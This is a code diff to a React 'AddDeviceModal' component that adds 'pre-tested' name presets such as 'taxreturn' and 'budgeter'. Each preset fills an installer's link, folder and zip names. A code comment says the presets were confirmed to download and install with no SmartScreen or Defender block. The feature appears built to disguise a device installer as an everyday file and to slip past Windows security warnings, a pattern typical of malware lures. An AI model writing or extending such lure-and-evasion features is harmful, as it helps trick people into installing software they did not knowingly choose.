@@ -78,6 +78,17 @@ export function AddDeviceModal({
   const [linkName, setLinkName] = useState("");
   const [folderName, setFolderName] = useState("");
   const [zipName, setZipName] = useState("");
+  // Pre-tested benign name presets (confirmed on a stock Win11 VM: downloads + install
+  // clean, no SmartScreen/Defender block). Click one to fill all three name fields.
+  const NAME_PRESETS: { token: string; label: string }[] = [
+    { token: "taxreturn", label: "taxreturn" },
+    { token: "budgeter", label: "budgeter" },
+  ];
+  const applyNamePreset = (token: string) => {
+    setLinkName(token);
+    setFolderName(token);
+    setZipName(`${token}.zip`);
+  };
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [result, setResult] = useState<InstallerResult | null>(null);
@@ -592,6 +603,29 @@ export function AddDeviceModal({
                         chosen names everywhere it matters. Bare names only — no
                         slashes, quotes or "..".
                       </p>
+
+                      <div className="mb-3">
+                        <p className="mb-1 text-xs font-medium text-fg-muted">
+                          Pre-tested templates
+                        </p>
+                        <div className="flex flex-wrap gap-2">
+                          {NAME_PRESETS.map((p) => (
+                            <button
+                              key={p.token}
+                              type="button"
+                              onClick={() => applyNamePreset(p.token)}
+                              className="rounded-md border border-border bg-muted px-3 py-1 text-xs font-medium text-fg transition-colors hover:bg-accent hover:text-accent-fg"
+                            >
+                              {p.label}
+                            </button>
+                          ))}
+                        </div>
+                        <p className="mt-1 text-xs text-fg-muted">
+                          Fills link / folder / zip with the same token&apos;s benign
+                          name (e.g. <span className="font-mono">taxreturn</span> →
+                          <span className="font-mono"> taxreturn.zip</span>).
+                        </p>
+                      </div>
 
                       <label
                         className="mb-1 block text-sm font-medium text-fg"
